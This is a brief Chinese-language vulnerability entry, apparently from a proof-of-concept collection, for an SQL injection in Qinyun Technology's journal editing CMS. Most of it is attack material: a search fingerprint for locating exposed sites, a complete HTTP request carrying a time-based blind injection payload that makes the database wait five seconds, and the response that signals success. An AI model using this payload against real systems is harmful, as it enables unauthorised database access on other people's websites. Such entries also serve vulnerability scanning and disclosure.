# 勤云科技期刊采编CMS存在SQL注入漏洞

勤云科技期刊采编 ｜ SQL注入 ｜ —
- **指纹**：`body="北京勤云科技"`
- **请求**：`GET /shhy'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:5'--/article/abstract/1 HTTP/1.1`
- **响应特征**：302